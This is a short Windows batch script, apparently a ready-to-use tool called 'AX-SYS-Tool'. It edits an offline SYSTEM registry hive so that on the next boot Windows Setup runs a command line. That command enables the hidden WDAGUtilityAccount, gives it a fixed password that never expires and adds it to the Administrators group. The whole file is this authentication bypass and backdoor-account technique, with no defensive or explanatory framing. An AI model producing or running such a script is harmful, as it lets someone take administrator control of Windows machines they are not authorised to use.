@echo off

rem AX-SYS-Tool
rem Made by FerrousInk
rem Version 5.0

reg load "HKLM\AX-SYS-SYSTEM" C:\Windows\System32\config\system
reg delete "HKLM\AX-SYS-SYSTEM\Setup" /v CmdLine /f
reg add "HKLM\AX-SYS-SYSTEM\Setup" /v CmdLine /t REG_SZ /d "C:\Windows\System32\cmd.exe /c net user WDAGUtilityAccount /active:yes && wmic UserAccount where Name='WDAGUtilityAccount' set PasswordExpires=False && net user WDAGUtilityAccount ax-sys-tool && net localgroup Administrators /add WDAGUtilityAccount"
reg delete "HKLM\AX-SYS-SYSTEM\Setup" /v SetupType /f
reg add "HKLM\AX-SYS-SYSTEM\Setup" /v SetupType /t REG_DWORD /d 2
exit